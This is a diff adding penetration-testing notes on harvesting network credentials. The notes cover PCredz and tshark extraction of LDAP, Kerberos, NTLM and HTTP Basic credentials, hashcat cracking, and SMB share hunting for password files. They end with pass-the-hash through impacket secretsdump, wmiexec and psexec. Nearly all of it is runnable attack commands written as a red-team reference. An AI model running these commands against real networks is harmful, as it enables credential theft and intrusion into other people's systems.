@@ -210,10 +210,264 @@ python3 Pcredz -f /tmp/mitm.pcap
 cat /tmp/CredentialsDump.txt
 ```
 
+## PCredz — Install and Full Usage
+
+```bash
+# PCredz: live capture + PCAP analysis, extracts credentials from:
+# Kerberos (AS-REQ, TGS-REP), NTLM, FTP, HTTP Basic, LDAP, POP3, IMAP,
+# SMTP, Telnet, IRC, SNMP, NFS, MySQL, MSSQL
+# github.com/lgandx/PCredz
+
+# Install
+git clone https://github.com/lgandx/PCredz
+cd PCredz
+pip3 install python-libpcap Cython
+# Or using the prebuilt package:
+apt install python3-pypcap
+
+# Run against live interface (requires root)
+python3 Pcredz -i eth0
+# Output appears on stdout and is written to /tmp/CredentialsDump.txt
+
+# Run against a PCAP file
+python3 Pcredz -f /tmp/capture.pcap
+
+# Run against a directory of PCAP files
+python3 Pcredz -d /tmp/pcaps/
+
+# Verbose — show all parsed frames, not just credentials
+python3 Pcredz -i eth0 -v
+
+# Output file location
+cat /tmp/CredentialsDump.txt
+
+# Parse output — group by protocol
+grep "FTP" /tmp/CredentialsDump.txt
+grep "NTLMv2" /tmp/CredentialsDump.txt
+grep "Kerberos" /tmp/CredentialsDump.txt
+
+# Extract just hashes for hashcat
+grep "NTLMv2" /tmp/CredentialsDump.txt | awk '{print $NF}' > ntlmv2_hashes.txt
+grep "Kerberos" /tmp/CredentialsDump.txt | awk '{print $NF}' > kerberos_hashes.txt
+
+# Crack NTLMv2 (hashcat mode 5600)
+hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
+# Crack Kerberos TGS (hashcat mode 13100)
+hashcat -m 13100 kerberos_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+## Protocol-Specific Credential Hunting
+
+### LDAP Bind Credentials
+
+```bash
+# LDAP port 389 = cleartext; port 636 = LDAPS (encrypted)
+# Port 3268 = Global Catalog; 3269 = GC over SSL
+
+# Live capture of LDAP binds
+tcpdump -i eth0 -A 'tcp port 389' 2>/dev/null | strings | grep -iE "uid=|password|bindRequest|1.2.840"
+
+# Tshark — extract bind credentials
+tshark -r capture.pcap -Y "ldap.bindRequest" \
+  -T fields -e frame.time -e ip.src -e ldap.name -e ldap.authentication.simple
+
+# Filter for SASL vs simple auth
+tshark -r capture.pcap -Y "ldap.bindRequest.version" -V \
+  | grep -A 10 "bindRequest"
+
+# Detect LDAP password spray in captures (many failed binds)
+tshark -r capture.pcap -Y "ldap.resultCode == 49" \
+  -T fields -e ip.src -e ldap.name
+# resultCode 49 = invalidCredentials
+```
+
+### Kerberos AS-REQ in PCAP
+
+```bash
+# Kerberos AS-REQ (password hash embedded when pre-auth is disabled)
+# Also: AS-REQ contains username even when pre-auth IS required → user enumeration
+
+# Extract AS-REQ usernames (user enumeration from capture)
+tshark -r capture.pcap -Y "kerberos.msg_type == 10" \
+  -T fields -e ip.src -e kerberos.CNameString -e kerberos.realm
+# msg_type 10 = AS-REQ
+
+# AS-REP hashes (pre-auth disabled — crackable offline)
+tshark -r capture.pcap -Y "kerberos.msg_type == 11" \
+  -T fields -e kerberos.CNameString -e kerberos.realm
+# PCredz extracts these in hashcat format automatically
+
+# TGS-REP (kerberoasting material)
+tshark -r capture.pcap -Y "kerberos.msg_type == 13" \
+  -T fields -e kerberos.CNameString -e kerberos.SNameString
+```
+
+### HTTP Basic Auth
+
+```bash
+# HTTP Basic Auth header: Authorization: Basic base64(user:pass)
+tshark -r capture.pcap -Y "http.authorization contains \"Basic\"" \
+  -T fields -e ip.src -e http.authorization
+
+# Decode all Basic auth headers
+tshark -r capture.pcap -Y "http.authorization contains \"Basic\"" \
+  -T fields -e http.authorization \
+  | sed 's/Basic //' | while read b64; do echo "$b64" | base64 -d; echo; done
+```
+
+## SMB Session Enumeration
+
+```bash
+# Identify who is currently logged in and where (pre-compromise recon)
+
+# Nmap SMB session script
+nmap --script smb-enum-sessions -p 445 192.168.1.0/24
+# Shows: logged-in users, null sessions, guest sessions
+
+# CrackMapExec — enumerate sessions on a target
+crackmapexec smb 192.168.1.0/24 --sessions
+# Output: username, source IP, logged in since
+
+# Enumerate open sessions (requires credentials)
+crackmapexec smb 192.168.1.10 -u jsmith -p Password1 --sessions
+
+# NetBIOS session enumeration
+nbtscan 192.168.1.0/24
+# Reveals: NetBIOS names, domain, MAC address
+
+# SMB share enumeration (find shares that might contain credentials)
+crackmapexec smb 192.168.1.10 -u jsmith -p Password1 --shares
+nmap --script smb-enum-shares -p 445 192.168.1.10
+
+# List active SMB connections (from a compromised Windows host)
+# net session
+# Get-SmbOpenFile | Select-Object SessionId, ClientComputerName, ClientUserName
+```
+
+## Extracting Credentials from PCAP Files
+
+```bash
+# Full workflow: tcpdump capture → filter → PCredz → Wireshark analysis
+
+# Step 1: Targeted capture (only credential-bearing ports)
+tcpdump -i eth0 -w /tmp/creds.pcap \
+  'tcp port 21 or tcp port 23 or tcp port 25 or tcp port 80 \
+   or tcp port 110 or tcp port 143 or tcp port 389 \
+   or tcp port 445 or tcp port 3389 or udp port 161' &
+
+# Let it run for 30-60 minutes during business hours
+sleep 3600
+kill %1
+
+# Step 2: PCredz full extraction
+python3 Pcredz -f /tmp/creds.pcap -v 2>&1 | tee /tmp/pcredz_output.txt
+cat /tmp/CredentialsDump.txt
+
+# Step 3: Wireshark filter cheatsheet for manual analysis
+# HTTP Basic Auth:    http.authorization
+# FTP credentials:    ftp.request.command == "PASS"
+# NTLM:              ntlmssp.auth.username
+# Kerberos:          kerberos.CNameString
+# LDAP binds:        ldap.bindRequest
+# SMTP auth:         smtp.auth.password
+# SMB auth:          smb.cmd == 0x73  (session setup)
+
+# Step 4: Follow TCP streams for context (tshark)
+# Find stream containing credentials
+tshark -r creds.pcap -Y "ftp.request.command == \"PASS\"" \
+  -T fields -e tcp.stream
+# Follow that stream:
+tshark -r creds.pcap -qz follow,tcp,ascii,<stream_number>
+
+# Step 5: Extract NTLM hashes in hashcat format (manual)
+# Wireshark → filter ntlmssp → find challenge and response
+# Required fields:
+# - ntlmssp.ntlmclientchallenge (8 bytes)
+# - ntlmssp.auth.username
+# - ntlmssp.auth.domain
+# - ntlmssp.ntlmserverchallenge (from CHALLENGE message)
+# - ntlmssp.auth.ntresponse (NTProofStr + blob)
+# PCredz does this automatically — use it for efficiency
+```
+
+## Network Share Hunting for Credential Files
+
+```bash
+# Shares often contain files with credentials in cleartext
+# passwords.txt, config.xml, web.config, *.config, *.ini, *.xml
+
+# Discover accessible shares
+crackmapexec smb 192.168.1.0/24 -u jsmith -p Password1 --shares
+# Look for: NETLOGON, SYSVOL, shares with non-standard names (data, backup, scripts)
+
+# Search shares for credential files (CrackMapExec spider)
+crackmapexec smb 192.168.1.10 -u jsmith -p Password1 -M spider_plus \
+  -o READ=True
+# spider_plus downloads files matching patterns
+
+# Impacket smbclient — manual share browsing
+impacket-smbclient contoso.local/jsmith:Password1@192.168.1.10
+# > shares       — list shares
+# > use SYSVOL   — browse SYSVOL
+# > ls           — list files
+# > get passwords.txt  — download file
+
+# Find specific file types across all shares
+crackmapexec smb 192.168.1.10 -u jsmith -p Password1 -M spider_plus \
+  -o PATTERN="*.xml,*.config,*.ini,*.txt,*.bat,*.ps1"
+
+# SYSVOL — always check for Group Policy Preferences (GPP) credentials
+# (MS14-025 — cpassword field in XML files)
+find /mnt/sysvol -name "*.xml" -exec grep -l "cpassword" {} \;
+# Or via CrackMapExec:
+crackmapexec smb 192.168.1.10 -u jsmith -p Password1 -M gpp_password
+
+# Common share credential file patterns
+# web.config — ASP.NET connection strings with DB passwords
+# appsettings.json — .NET Core app configs
+# *.properties — Java app configs
+# *.env — environment files with API keys
+# Jenkinsfile, .gitlab-ci.yml — CI/CD pipeline credentials
+# backup*.* — database dumps, often contain plaintext data
+```
+
+## Pass-the-Hash and Pass-the-Ticket from Network-Captured Material
+
+```bash
+# From NTLMv2 capture → crack → use plaintext password for PTH
+hashcat -m 5600 ntlmv2.txt rockyou.txt --show
+# If cracked: jsmith:Password1
+# Use password for PTH (need NT hash, not password):
+python3 -c "import hashlib; print(hashlib.new('md4', 'Password1'.encode('utf-16le')).hexdigest())"
+# NT hash: <hash>
+crackmapexec smb 192.168.1.0/24 -u jsmith -H <NThash>
+
+# From PCAP → PCredz extracts Kerberos TGS (TGS-REP) → kerberoasting
+# TGS hashes from PCredz output — already in hashcat 13100 format
+hashcat -m 13100 tgs_hashes.txt rockyou.txt -r rules/best64.rule
+
+# From PCAP → NTLM relay via ntlmrelayx (not cracking — direct relay)
+# See: /network-attacks/responder/ for relay workflow
+
+# From captured Kerberos ccache files (memory / network)
+# If Kerberos tickets captured in transit → export and use
+# Wireshark: File → Export Objects → can't export Kerberos directly
+# Use tcpdump + tshark pipeline:
+tshark -r capture.pcap -Y "kerberos" -w kerberos_only.pcap
+# Then process with krb5-tools or Pcredz to extract ticket material
+
+# Impacket tools with NT hash (PTH)
+impacket-secretsdump -hashes :NThash contoso.local/jsmith@192.168.1.10
+impacket-wmiexec -hashes :NThash contoso.local/jsmith@192.168.1.10
+impacket-psexec -hashes :NThash contoso.local/jsmith@192.168.1.10
+```
+
 ## Resources
 
 - PCredz — `github.com/lgandx/PCredz`
 - NetworkMiner — `netresec.com/?page=NetworkMiner`
 - Seth (RDP MITM) — `github.com/SySS-Research/Seth`
+- CrackMapExec — `github.com/byt3bl33d3r/CrackMapExec`
+- Impacket — `github.com/fortra/impacket`
 - MITRE T1040 — Network Sniffing — `attack.mitre.org/techniques/T1040/`
 - MITRE T1557 — Adversary-in-the-Middle — `attack.mitre.org/techniques/T1557/`
